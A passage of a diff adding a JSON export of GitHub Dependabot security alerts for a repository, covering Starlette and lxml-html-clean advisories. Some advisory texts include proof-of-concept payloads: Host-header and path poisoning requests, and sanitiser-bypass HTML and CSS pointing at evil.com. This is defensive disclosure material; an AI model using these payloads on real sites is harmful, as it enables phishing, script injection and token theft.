+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/217",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/217",
+        "created_at": "2026-06-17T04:37:02Z",
+        "updated_at": "2026-06-17T04:37:02Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 215,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "Starlette"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-jp82-jpqv-5vv3",
+            "cve_id": "CVE-2026-54282",
+            "summary": "Starlette: Unvalidated request path concatenated into authority poisons request.url.hostname",
+            "description": "### Summary\n\nIn affected versions, the HTTP request path is not validated before being used to reconstruct `request.url`. Because `request.url` is rebuilt by concatenating `{scheme}://{host}{path}` and re-parsing the result, a path that does not begin with `/` (for example `@google.com`) moves the authority boundary during re-parsing, so `request.url.hostname` and `request.url.netloc` become attacker-controlled. Code that reads `request.url.hostname` (rather than the `Host` header or `scope`) can therefore be misled into trusting an attacker-supplied host.\n\n### Details\n\nWhen a client requests a path that does not start with `/`:\n\n```http\nGET @google.com HTTP/1.1\nHost: localhost\n```\n\naffected versions reconstruct the URL as `http://localhost@google.com`. Per [RFC 3986 §3.2.1](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.1), the substring before `@` in the authority is `userinfo`, so re-parsing yields `username = \"localhost\"` and `hostname = \"google.com\"`, with an empty path:\n\n```text\nrequest.url          == \"http://localhost@google.com\"\nrequest.url.hostname == \"google.com\"\nrequest.url.path     == \"\"\n```\n\nThe root cause is that the path is concatenated directly after the host without a separating `/`, and without validating that it begins with one. Only the `Host` header was validated when constructing `request.url`; the path was not.\n\nThis requires an ASGI server that forwards a request-target lacking a leading `/` into `scope[\"path\"]`.\n\n### Impact\n\nAny application running an affected version that uses `request.url`, `request.url.netloc`, or `request.url.hostname` for a security-sensitive decision (host-based authorization, redirect/callback base, SSRF target, cache key, audit log) may be affected, when no fronting proxy or load balancer rejects the malformed request-target first.\n\nNote that this is less exploitable than [GHSA-86qp-5c8j-p5mr](https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr): there, the poison is carried in the `Host` header, so the real path still routes to a valid endpoint while `request.url.path` lies. Here, the poison must be carried in the path itself, and that path (`@google.com`) does not match any registered route, so routing returns `404` and no endpoint handler runs. The exposure is limited to code that reads `request.url` before routing - notably middleware - or in 404/exception handlers.\n\n### Mitigation\n\nUpgrade to a patched version, which prevents the request path from crossing into the URL authority. The request above instead yields `http://localhost/@google.com` with `request.url.hostname == \"localhost\"`.",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-jp82-jpqv-5vv3",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-54282",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-jp82-jpqv-5vv3"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54282"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/starlette/PYSEC-2026-248.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-jp82-jpqv-5vv3"
+                }
+            ],
+            "published_at": "2026-06-15T20:38:08Z",
+            "updated_at": "2026-07-15T22:07:17Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "Starlette"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": "< 1.3.0",
+                    "first_patched_version": {
+                        "identifier": "1.3.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                    "score": 3.7
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00187,
+                "percentile": 0.08544
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                "score": 3.7
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-20",
+                    "name": "Improper Input Validation"
+                },
+                {
+                    "cwe_id": "CWE-706",
+                    "name": "Use of Incorrectly-Resolved Name or Reference"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "Starlette"
+            },
+            "severity": "low",
+            "vulnerable_version_range": "< 1.3.0",
+            "first_patched_version": {
+                "identifier": "1.3.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/215",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/215",
+        "created_at": "2026-06-16T22:12:43Z",
+        "updated_at": "2026-06-16T22:12:43Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 213,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "starlette"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-x746-7m8f-x49c",
+            "cve_id": "CVE-2026-48817",
+            "summary": "Starlette: Arbitrary HTTP method dispatched to `HTTPEndpoint` attributes via `getattr`",
+            "description": "### Summary\n\nWhen dispatching a request, `HTTPEndpoint` selects the handler by lowercasing the HTTP method and looking it up as an attribute with `getattr`, without restricting the lookup to a known set of HTTP verbs.\n\nWhen an `HTTPEndpoint` subclass is registered through `Route(...)` without an explicit `methods=` argument, the route does not constrain the method and every method reaches the endpoint. If a non-standard HTTP method whose lowercased name matches an attribute on the endpoint subclass reaches the endpoint, that attribute is invoked as if it were a request handler. An attacker can use this to reach methods that were never meant to be HTTP handlers, such as internal helpers, without the authorization checks applied by the intended public handler.\n\n### Details\n\n`HTTPEndpoint` uses the client-supplied method name to resolve an instance attribute, without validating it against the set of HTTP verbs the endpoint supports. A method such as `_DO_DELETE` therefore resolves an attribute like `_do_delete` and invokes it. Non-standard methods are valid [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110#name-method) token methods, so an endpoint must not treat the method name as a trusted attribute selector.\n\n### Impact\n\nAn application is affected when all of the following hold:\n\n* It defines an `HTTPEndpoint` subclass and registers it via `Route(...)` without an explicit `methods=` argument.\n* The subclass defines additional methods whose names match a non-standard HTTP-method token shape and that accept a single `request` argument and return a response.\n\nThis also affects frameworks built on Starlette, like FastAPI.\n\n### Mitigation\n\nRegister `HTTPEndpoint` subclasses with an explicit `methods=` argument on the `Route`, listing only the HTTP verbs the endpoint supports. The route then rejects any other method with `405 Method Not Allowed` before it reaches the endpoint, so non-standard methods cannot resolve an attribute.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-x746-7m8f-x49c",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-48817",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-x746-7m8f-x49c"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48817"
+                },
+                {
+                    "url": "https://github.com/Kludex/starlette/releases/tag/1.1.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-x746-7m8f-x49c"
+                }
+            ],
+            "published_at": "2026-06-15T20:16:05Z",
+            "updated_at": "2026-07-09T21:05:47Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "starlette"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 1.1.0",
+                    "first_patched_version": {
+                        "identifier": "1.1.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                    "score": 5.3
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00213,
+                "percentile": 0.11544
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                "score": 5.3
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-470",
+                    "name": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "starlette"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 1.1.0",
+            "first_patched_version": {
+                "identifier": "1.1.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/213",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/213",
+        "created_at": "2026-06-16T18:56:19Z",
+        "updated_at": "2026-06-16T18:56:19Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 195,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "starlette"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-86qp-5c8j-p5mr",
+            "cve_id": "CVE-2026-48710",
+            "summary": "Starlette has missing Host header validation that poisons request.url.path, bypassing path-based security checks",
+            "description": "### Summary\nIn affected versions, the HTTP `Host` request header was not validated before being used to reconstruct `request.url`. Because the routing algorithm relies on the raw HTTP path while `request.url` is rebuilt from the `Host` header, a malformed header could make `request.url.path` differ from the path that was actually requested. Middleware and endpoints that apply security restrictions based on `request.url` (rather than the raw `scope` path) could therefore be bypassed.\n\n### Details\nWhen a client requests `http://example.com/foo`, it sends:\n\n```http\nGET /foo HTTP/1.1\nHost: example.com\n```\n\nAffected versions reconstructed the URL by concatenating `http://{host}{path}` and re-parsing the result. The `Host` value is only valid as a `uri-host [ \":\" port ]` per [RFC 9112 §3.2](https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2-6), where `uri-host` follows the restricted `host` grammar of [RFC 3986 §3.2.2](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.2). When it contains characters outside that grammar - notably `/`, `?`, or `#` - those characters move the path/query/fragment boundaries during re-parsing, so the parsed `request.url.path` no longer matches the path the server actually received. For example:\n\n```http\nGET /foo HTTP/1.1\nHost: example.com/abc?bar=\n```\n\nreconstructs to `http://example.com/abc?bar=/foo`, whose parsed `path` is `/abc` - even though routing used the real path `/foo`. The router still dispatches to `/foo` and the endpoint executes, but any middleware or code that reads `request.url.path` sees `/abc`, so path-based authorization checks can be bypassed.\n\n### Impact\nAny application running an affected version that relies on `request.url` (or `request.url.path`) for security-sensitive decisions is affected. The most common case is middleware that gates access to certain path prefixes based on `request.url.path`. Deployments fronted by a proxy or load balancer are mitigated only if that proxy rejects or normalizes the malformed `Host` header before forwarding and the application does not trust attacker-controlled host headers (e.g. `X-Forwarded-Host`) elsewhere.\n\n### Mitigation\nUpgrade to a patched version, which validates the `Host` header against the grammar of [RFC 9112 §3.2](https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2-6) / [RFC 3986 §3.2.2](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.2) when constructing `request.url` and falls back to `scope[\"server\"]` for malformed values.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-86qp-5c8j-p5mr",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-48710",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48710"
+                },
+                {
+                    "url": "https://github.com/Kludex/starlette/commit/764dab0dcfb9033d75442d7a359645c9f94648c6"
+                },
+                {
+                    "url": "https://badhost.org"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/starlette/PYSEC-2026-161.yaml"
+                },
+                {
+                    "url": "https://ostif.org/disclosing-the-badhost-vulnerability-in-starlette"
+                },
+                {
+                    "url": "https://www.secwest.net/starlette"
+                },
+                {
+                    "url": "https://www.x41-dsec.de/lab/advisories/x41-2026-002-starlette"
+                },
+                {
+                    "url": "https://www.cve.org/CVERecord?id=CVE-2026-48710"
+                },
+                {
+                    "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48710.json"
+                },
+                {
+                    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2481742"
+                },
+                {
+                    "url": "https://access.redhat.com/security/cve/CVE-2026-48710"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:34532"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:34526"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:34456"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:30089"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:30088"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:26226"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:24866"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:23346"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:22993"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:22992"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:37275"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:43038"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:44696"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:51357"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-86qp-5c8j-p5mr"
+                }
+            ],
+            "published_at": "2026-06-04T13:15:17Z",
+            "updated_at": "2026-08-07T12:31:53Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "starlette"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 1.0.0",
+                    "first_patched_version": {
+                        "identifier": "1.0.1"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                    "score": 6.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.01839,
+                "percentile": 0.76726
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "score": 6.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-444",
+                    "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+                },
+                {
+                    "cwe_id": "CWE-1289",
+                    "name": "Improper Validation of Unsafe Equivalence in Input"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "starlette"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 1.0.0",
+            "first_patched_version": {
+                "identifier": "1.0.1"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/195",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/195",
+        "created_at": "2026-06-04T14:24:56Z",
+        "updated_at": "2026-06-04T14:24:56Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 140,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-xvp8-3mhv-424c",
+            "cve_id": "CVE-2026-28350",
+            "summary": "lxml-html-clean has <base> tag injection through default Cleaner configuration",
+            "description": "### Summary\nThe `<base>` tag passes through the default `Cleaner` configuration. While `page_structure=True` removes `html`, `head`, and `title` tags, there is no specific handling for `<base>`, allowing an attacker to inject it and hijack relative links on the page.\n\n### Details\nThe `<base>` tag is not currently in the `page_structure` kill set. Even though the specification says `<base>` must be inside `<head>`, browsers accept `<base>` tags outside of the head.\n\nIf an attacker injects a `<base>` tag, it changes the base URL for all relative URLs on the page (links, images, scripts) to a domain controlled by the attacker.\n\n### PoC\n```python\nfrom lxml_html_clean import clean_html\n\n# The base tag is preserved in the output\nresult = clean_html('<base href=\"http://evil.com/\"><a href=\"/account\">Account</a>')\nprint(result)\n# Output: <div><base href=\"http://evil.com/\">...<a href=\"/account\">Account</a></div>\n```\n\n### Impact\nThe injection of a `<base>` tag allows an attacker to hijack the resolution of **all** relative URLs on the page. This results in three critical attack vectors:\n\n1.  **Phishing & Redirection:** Attackers can redirect user navigation (e.g., `<a href=\"/login\">`) and form submissions (e.g., `<form action=\"/auth\">`) to an attacker-controlled domain, effectively stealing credentials or sensitive data without the user realizing they have left the legitimate site.\n2.  **Cross-Site Scripting (XSS):** If the victim application loads JavaScript files using relative paths (e.g., `<script src=\"assets/app.js\">`), the browser will attempt to fetch the script from the attacker's domain. This upgrades the vulnerability from HTML injection to full Stored XSS.\n3.  **Defacement:** Relative references to images (`<img>`) and stylesheets (`<link>`) will be loaded from the attacker's server, allowing for UI redressing or defacement.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-xvp8-3mhv-424c",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-28350",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-xvp8-3mhv-424c"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/commit/9c5612ca33b941eec4178abf8a5294b103403f34"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28350"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-xvp8-3mhv-424c"
+                }
+            ],
+            "published_at": "2026-03-02T19:35:52Z",
+            "updated_at": "2026-03-05T22:49:26Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml-html-clean"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 0.4.3",
+                    "first_patched_version": {
+                        "identifier": "0.4.4"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                    "score": 6.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00254,
+                "percentile": 0.1658
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                "score": 6.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-116",
+                    "name": "Improper Encoding or Escaping of Output"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 0.4.3",
+            "first_patched_version": {
+                "identifier": "0.4.4"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/140",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/140",
+        "created_at": "2026-03-03T12:05:19Z",
+        "updated_at": "2026-08-16T01:17:11Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 139,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "manifest_path": "backend/requirements/dev.txt",
+            "scope": "development",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-xvp8-3mhv-424c",
+            "cve_id": "CVE-2026-28350",
+            "summary": "lxml-html-clean has <base> tag injection through default Cleaner configuration",
+            "description": "### Summary\nThe `<base>` tag passes through the default `Cleaner` configuration. While `page_structure=True` removes `html`, `head`, and `title` tags, there is no specific handling for `<base>`, allowing an attacker to inject it and hijack relative links on the page.\n\n### Details\nThe `<base>` tag is not currently in the `page_structure` kill set. Even though the specification says `<base>` must be inside `<head>`, browsers accept `<base>` tags outside of the head.\n\nIf an attacker injects a `<base>` tag, it changes the base URL for all relative URLs on the page (links, images, scripts) to a domain controlled by the attacker.\n\n### PoC\n```python\nfrom lxml_html_clean import clean_html\n\n# The base tag is preserved in the output\nresult = clean_html('<base href=\"http://evil.com/\"><a href=\"/account\">Account</a>')\nprint(result)\n# Output: <div><base href=\"http://evil.com/\">...<a href=\"/account\">Account</a></div>\n```\n\n### Impact\nThe injection of a `<base>` tag allows an attacker to hijack the resolution of **all** relative URLs on the page. This results in three critical attack vectors:\n\n1.  **Phishing & Redirection:** Attackers can redirect user navigation (e.g., `<a href=\"/login\">`) and form submissions (e.g., `<form action=\"/auth\">`) to an attacker-controlled domain, effectively stealing credentials or sensitive data without the user realizing they have left the legitimate site.\n2.  **Cross-Site Scripting (XSS):** If the victim application loads JavaScript files using relative paths (e.g., `<script src=\"assets/app.js\">`), the browser will attempt to fetch the script from the attacker's domain. This upgrades the vulnerability from HTML injection to full Stored XSS.\n3.  **Defacement:** Relative references to images (`<img>`) and stylesheets (`<link>`) will be loaded from the attacker's server, allowing for UI redressing or defacement.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-xvp8-3mhv-424c",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-28350",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-xvp8-3mhv-424c"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/commit/9c5612ca33b941eec4178abf8a5294b103403f34"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28350"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-xvp8-3mhv-424c"
+                }
+            ],
+            "published_at": "2026-03-02T19:35:52Z",
+            "updated_at": "2026-03-05T22:49:26Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml-html-clean"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 0.4.3",
+                    "first_patched_version": {
+                        "identifier": "0.4.4"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                    "score": 6.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00254,
+                "percentile": 0.1658
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                "score": 6.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-116",
+                    "name": "Improper Encoding or Escaping of Output"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 0.4.3",
+            "first_patched_version": {
+                "identifier": "0.4.4"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/139",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/139",
+        "created_at": "2026-03-03T12:05:19Z",
+        "updated_at": "2026-08-16T01:17:15Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 138,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-hw26-mmpg-fqfg",
+            "cve_id": "CVE-2026-28348",
+            "summary": "lxml-html-clean has CSS @import Filter Bypass via Unicode Escapes",
+            "description": "### Summary\nThe `_has_sneaky_javascript()` method strips backslashes before checking for dangerous CSS keywords. This causes CSS Unicode escape sequences to bypass the `@import` and `expression()` filters, allowing external CSS loading or XSS in older browsers.\n\n### Details\nThe root cause is located in `clean.py` (around line 594):\n```python\nstyle = style.replace('\\\\', '')\n```\nThis transformation changes a payload like `@\\69mport` into `@69mport`. This resulting string does NOT match the blacklist keyword `@import`. However, all modern browsers' CSS parsers decode `\\69` as the character 'i' (hex 69) according to CSS spec section 4.3.7, interpreting `@\\69mport` as a valid `@import` statement.\n\nSame root cause bypasses `expression()` detection: `\\65xpression(alert(1))` passes through (IE only).\n\n### PoC\n```python\nfrom lxml_html_clean import clean_html\n\n# Normal @import is correctly blocked:\n# clean_html('<style>@import url(\"http://evil.com/x.css\");</style>')\n# Output: <div><style> url(\"http://evil.com/x.css\");</style></div>\n\n# Unicode escape bypass:\nresult = clean_html('<style>@\\\\69mport url(\"http://evil.com/x.css\");</style>')\nprint(result)\n# Output: <div><style>@\\69mport url(\"http://evil.com/x.css\");</style></div>\n```\nIf rendered in a browser, the browser loads the external CSS. Variants like `@\\0069mport`, `@\\69 mport` (trailing space), and `@\\49mport` (uppercase I) also work.\n\n### Impact\nExternal CSS loading enables data exfiltration via attribute selectors (e.g., reading CSRF tokens), UI redressing, and phishing. In older browsers (IE), this allows for full XSS via `expression()`.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-hw26-mmpg-fqfg",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-28348",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-hw26-mmpg-fqfg"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/commit/2ef732667ddbc74ea59847bcf24b75809aaeed3b"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28348"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-hw26-mmpg-fqfg"
+                }
+            ],
+            "published_at": "2026-03-02T19:19:15Z",
+            "updated_at": "2026-03-05T22:49:21Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml-html-clean"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 0.4.3",
+                    "first_patched_version": {
+                        "identifier": "0.4.4"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                    "score": 6.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00228,
+                "percentile": 0.13565
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                "score": 6.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-116",
+                    "name": "Improper Encoding or Escaping of Output"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 0.4.3",
+            "first_patched_version": {
+                "identifier": "0.4.4"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/138",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/138",
+        "created_at": "2026-03-03T12:01:37Z",
+        "updated_at": "2026-08-16T01:17:11Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 137,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "manifest_path": "backend/requirements/dev.txt",
+            "scope": "development",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-hw26-mmpg-fqfg",
+            "cve_id": "CVE-2026-28348",
